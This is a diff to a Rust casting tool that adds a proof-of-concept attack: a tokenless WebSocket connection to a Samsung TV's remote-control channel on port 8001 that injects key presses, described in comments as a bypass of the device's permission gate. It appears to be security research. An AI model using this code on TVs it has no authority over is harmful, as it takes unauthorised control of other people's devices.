@@ -317,6 +317,74 @@ fn ua() -> Option<&'static String> {
     unsafe { UA.as_ref() }
 }
 
+/// Minimal base64 for the `name=` parameter the remote channel demands.
+fn b64(data: &[u8]) -> String {
+    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut o = String::new();
+    for c in data.chunks(3) {
+        let b = [c[0], *c.get(1).unwrap_or(&0), *c.get(2).unwrap_or(&0)];
+        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
+        o.push(T[(n >> 18 & 63) as usize] as char);
+        o.push(T[(n >> 12 & 63) as usize] as char);
+        o.push(if c.len() > 1 { T[(n >> 6 & 63) as usize] as char } else { '=' });
+        o.push(if c.len() > 2 { T[(n & 63) as usize] as char } else { '=' });
+    }
+    o
+}
+
+/// One WebSocket text frame. Client frames must be masked, so this is not just a
+/// length prefix.
+fn ws_send_text(s: &mut TcpStream, payload: &str) -> std::io::Result<()> {
+    let p = payload.as_bytes();
+    let mut f = Vec::with_capacity(p.len() + 14);
+    f.push(0x81); // FIN + text
+    let mask = (std::process::id() as u32).wrapping_mul(2654435761).to_be_bytes();
+    if p.len() < 126 {
+        f.push(0x80 | p.len() as u8);
+    } else {
+        f.push(0x80 | 126);
+        f.extend_from_slice(&(p.len() as u16).to_be_bytes());
+    }
+    f.extend_from_slice(&mask);
+    for (i, b) in p.iter().enumerate() {
+        f.push(b ^ mask[i % 4]);
+    }
+    s.write_all(&f)
+}
+
+/// Read one frame: (opcode, payload). Server frames arrive unmasked; handle both
+/// so anything in between cannot confuse the parse.
+fn ws_frame(s: &mut TcpStream) -> std::io::Result<(u8, Vec<u8>)> {
+    let mut h = [0u8; 2];
+    s.read_exact(&mut h)?;
+    let op = h[0] & 0x0f;
+    let mut len = (h[1] & 0x7f) as usize;
+    if len == 126 {
+        let mut e = [0u8; 2];
+        s.read_exact(&mut e)?;
+        len = u16::from_be_bytes(e) as usize;
+    } else if len == 127 {
+        let mut e = [0u8; 8];
+        s.read_exact(&mut e)?;
+        len = u64::from_be_bytes(e) as usize;
+    }
+    let masked = h[1] & 0x80 != 0;
+    let mut mask = [0u8; 4];
+    if masked {
+        s.read_exact(&mut mask)?;
+    }
+    let mut p = vec![0u8; len];
+    if len > 0 {
+        s.read_exact(&mut p)?;
+    }
+    if masked {
+        for (i, b) in p.iter_mut().enumerate() {
+            *b ^= mask[i % 4];
+        }
+    }
+    Ok((op, p))
+}
+
 /// SOAP headers, plus the control-point name when --ua was given.
 fn hdrs<'a>(soapaction: &'a str) -> Vec<(&'a str, &'a str)> {
     let mut h = vec![
@@ -712,6 +780,13 @@ fn usage() {
   --media <path>     mp4 to serve, faststart    (default ./media.mp4)
   --port <n>         local HTTP port            (default {DEFAULT_PORT})
   --status           read-only: transport + caption state, then exit
+  --ws               open the remote-control channel on :8001 and send a key;
+                     that path reaches the input subsystem, not dmr
+  --key <NAME>       key to send with --ws            (default KEY_VOLDOWN)
+  --ws-name <s>      control-point name in the handshake
+  --ws-port <n>      remote channel port              (default 8001)
+  --token <s>        token to present, if the TV ever issued one
+  --no-key           --ws: connect and listen only, send nothing
   --vol              RenderingControl PoC: read volume, set it, read it back
   --set-volume <n>   volume --vol should set                    (default 6)
   --mute             also fire SetMute(1) during --vol
@@ -837,6 +912,103 @@ fn run() {
     if let Some(name) = args.val("--ua") {
         println!("    [UA] presenting as control point {name:?}");
         unsafe { UA = Some(name); }
+    }
+
+    // --ws: the remote-control channel. The upgrade on 8001 is accepted with no
+    // token at all - the TV answers 101 Switching Protocols to a bare
+    // GET /api/v2/channels/samsung.remote.control?name=<base64> - which is why
+    // this is worth finishing: keys sent over this channel reach the input
+    // subsystem directly, not dmr, so RDM's PERMITTED gate does not apply to
+    // them. What decides everything is the first frame the TV pushes after the
+    // upgrade: ms.channel.connect means the session is live (and carries the
+    // token, if one is issued), ms.channel.unauthorized means it wants the
+    // on-screen approval instead.
+    if args.has("--ws") {
+        let port: u16 = args.val("--ws-port").and_then(|v| v.parse().ok()).unwrap_or(8001);
+        let name = args.val("--ws-name").unwrap_or_else(|| "captioncast".to_string());
+        let mut path = format!("/api/v2/channels/samsung.remote.control?name={}",
+                               b64(name.as_bytes()));
+        if let Some(t) = args.val("--token") {
+            path.push_str(&format!("&token={t}"));
+        }
+        println!("=== remote channel ws://{tv_ip}:{port}{path} ===");
+
+        let addr = match (tv_ip.as_str(), port).to_socket_addrs().ok().and_then(|mut a| a.next()) {
+            Some(a) => a,
+            None => { eprintln!("cannot resolve {tv_ip}"); return; }
+        };
+        let mut s = match TcpStream::connect_timeout(&addr, Duration::from_secs(6)) {
+            Ok(s) => s,
+            Err(e) => { println!("connect failed: {e}"); return; }
+        };
+        let _ = s.set_read_timeout(Some(Duration::from_secs(12)));
+        let req = format!("GET {path} HTTP/1.1\r\nHost: {tv_ip}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: http://{tv_ip}:{port}\r\n\r\n");
+        if let Err(e) = s.write_all(req.as_bytes()) {
+            println!("send failed: {e}");
+            return;
+        }
+
+        // Read the handshake a byte at a time so we stop exactly at the blank
+        // line and do not swallow the first frame.
+        let mut hdr = Vec::new();
+        let mut one = [0u8; 1];
+        while hdr.len() < 4096 {
+            match s.read(&mut one) {
+                Ok(1) => {
+                    hdr.push(one[0]);
+                    if hdr.ends_with(b"\r\n\r\n") { break; }
+                }
+                _ => break,
+            }
+        }
+        let head = String::from_utf8_lossy(&hdr).into_owned();
+        let status = head.lines().next().unwrap_or("(nothing)").to_string();
+        println!("[1] {status}");
+        if !status.contains("101") {
+            println!("{}", &head[..head.len().min(400)]);
+            return;
+        }
+        println!("    upgraded, no token presented");
+
+        let key = args.val("--key").unwrap_or_else(|| "KEY_VOLDOWN".to_string());
+        let mut sent = false;
+        let t0 = Instant::now();
+        while t0.elapsed() < Duration::from_secs(25) {
+            let (op, payload) = match ws_frame(&mut s) {
+                Ok(v) => v,
+                Err(e) => { println!("[.] no more frames: {e}"); break; }
+            };
+            if op == 0x8 {
+                println!("[.] server closed the channel");
+                break;
+            }
+            if op == 0x9 {
+                continue; // ping
+            }
+            let txt = String::from_utf8_lossy(&payload).into_owned();
+            println!("[<] {}", &txt[..txt.len().min(800)]);
+
+            if txt.contains("ms.channel.unauthorized") {
+                println!("    -> the channel wants the on-screen approval; no key will go through");
+                break;
+            }
+            if txt.contains("ms.channel.connect") && !sent {
+                if args.has("--no-key") {
+                    println!("    -> connected; sending nothing (--no-key)");
+                    break;
+                }
+                let cmd = format!("{{\"method\":\"ms.remote.control\",\"params\":{{\"Cmd\":\"Click\",\"DataOfCmd\":\"{key}\",\"Option\":\"false\",\"TypeOfRemote\":\"SendRemoteKey\"}}}}");
+                match ws_send_text(&mut s, &cmd) {
+                    Ok(()) => println!("[>] sent {key} - watch the TV"),
+                    Err(e) => println!("[>] send failed: {e}"),
+                }
+                sent = true;
+            }
+        }
+        if sent {
+            println!("\nIf the volume moved, this channel is a full bypass of the RDM gate.");
+        }
+        return;
     }
 
     if args.has("--vol") {
